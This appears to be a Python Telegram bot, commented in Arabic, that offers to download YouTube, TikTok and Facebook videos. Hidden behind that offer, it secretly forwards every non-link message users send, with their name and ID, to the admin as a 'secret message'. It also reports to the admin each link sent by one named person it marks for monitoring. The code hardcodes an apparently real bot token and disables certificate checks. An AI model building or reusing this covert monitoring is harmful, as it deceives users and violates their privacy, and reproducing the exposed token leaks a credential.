import os
import yt_dlp
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- الإعدادات الأساسية ---
TOKEN = "8471320360:AAHrI1iS4e4RNxs3AVUvplh1cA1pfI0XcsI"
ADMIN_ID = 1420457711  # أيديك (علي)
TARGET_USER_ID = 2034540192 # أيدي عبود للمراقبة

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    await update.message.reply_text(
        f"هلا {user_name}! وياك بوت علي للتحميل 🚀\n\n"
        "دزلي رابط (يوتيوب، تيك توك، فيسبوك) وأني أحمله الك فيديو وبصمة صوت! 🎬🎤"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    
    # 1. إذا كانت الرسالة رابط (التحميل يشتغل فقط هنا)
    if text.startswith("http"):
        # رادار المراقبة لعبود إذا دز رابط
        if user.id == TARGET_USER_ID:
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎯 عبود دز رابط هسة:\n🔗 {text}")
        
        await update.message.reply_text("صبرك عليّ.. جاي أحمل الفيديو 🙂")
        
        try:
            ydl_opts = {
                'format': 'best',
                'outtmpl': f'file_{user.id}.%(ext)s',
                'quiet': True,
                'no_warnings': True,
                'ignoreerrors': True,
                'nocheckcertificate': True,
                'add_header': ['User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)']
            }

            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(text, download=True)
                if not info: raise Exception("Error")
                
                filename = ydl.prepare_filename(info)
                title = info.get('title', 'مقطع جديد')
                artist = info.get('uploader', 'مجهول')

            # إرسال الفيديو
            with open(filename, 'rb') as f:
                await context.bot.send_video(chat_id=update.message.chat_id, video=f, caption=f"✅ {title}")
            
            # إرسال البصمة (فويز)
            with open(filename, 'rb') as f:
                await context.bot.send_voice(chat_id=update.message.chat_id, voice=f, caption=f"🎤 بصمة: {artist}")
            
            os.remove(filename)
                
        except Exception:
            await update.message.reply_text("❌ صار خطأ بالرابط أو الموقع محظور!")

    # 2. أي كلام ثاني (مو رابط) يتحول لرسالة سرية إلك فوراً
    else:
        report = f"📩 رسالة سرية جديدة:\n👤 الأسم: {user.first_name}\n🆔 الايدي: `{user.id}`\n💬 الكلام: {text}"
        await context.bot.send_message(chat_id=ADMIN_ID, text=report)

if __name__ == '__main__':
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()
